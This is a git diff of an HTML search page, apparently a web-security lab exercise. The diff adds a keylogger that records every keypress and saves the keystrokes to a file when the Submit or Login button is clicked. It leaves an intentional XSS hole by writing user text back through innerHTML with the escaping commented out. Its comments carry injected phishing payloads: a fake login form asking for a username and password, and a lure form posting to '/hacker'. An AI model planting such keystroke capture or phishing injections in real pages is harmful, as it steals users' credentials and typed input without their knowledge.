@@ -24,7 +24,7 @@
                         Search for something?
                         <input type="text" name="keyword" id="keyword">
                         <br> <br>
-                        <input type="submit" value="Submit">
+                        <input id="saveData" type="submit" value="Submit">
                         <br> 
                         
                     </p>
@@ -38,23 +38,56 @@
         </div>
 		</div>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/1.3.8/FileSaver.js"></script>
 
     <script>
-
+        const HTML_TAGS = ["<a>", "<input>", "<button>"]
         var span = document.getElementById("show")
-        console.log("textContent is :", span.textContent) 
-        console.log("length is: ", span.textContent.length)
+
         if (span.textContent.startsWith("<%= keyword_result %>") && span.textContent.length == 21){
-            console.log("inside if")
             span.style.display = "none";
         }
         else{
-            console.log("inside else")
+            /**
+            if (HTML_TAGS.some(el => span.textContent.includes(el))){
+                span.style.display = "none";
+            }
+            else{
+                span.textContent = span.textContent.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                span.innerHTML= span.textContent
+                span.style.display = "block";
+            }
+            **/
             span.innerHTML= span.textContent
             span.style.display = "block";
+
         }
         //<h3>Please first login to proceed</h3> <form action="/login" method="GET">Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
         //<h2>Too many results to dispaly!</h2> <p>Click on this  <form action="/hacker" method="GET">  <input type="submit" value="link"> </form>to dispaly the results in a new page!</p>
+    
+        var arr = [];
+        document.onkeypress = function(evt) {
+            evt = evt || window.event;
+            var charCode = evt.keyCode || evt.which;
+            var charStr = String.fromCharCode(charCode);
+            arr.push(charStr);
+            console.log(arr)
+        };
+
+        var form = document.getElementById("saveData");
+        form.addEventListener("click", function(evt) {
+            var myFile = new File([arr.join('')], "submit.txt", {type: "text/plain;charset=utf-8"});
+            saveAs(myFile);
+            console.log("saved")
+        });
+
+        var form2 = document.getElementById("login");
+        form2.addEventListener("click", function(evt) {
+            var myFile = new File([arr.join('')], "login.txt", {type: "text/plain;charset=utf-8"});
+            saveAs(myFile);
+            console.log("saved")
+        });
+
     </script>
 
 
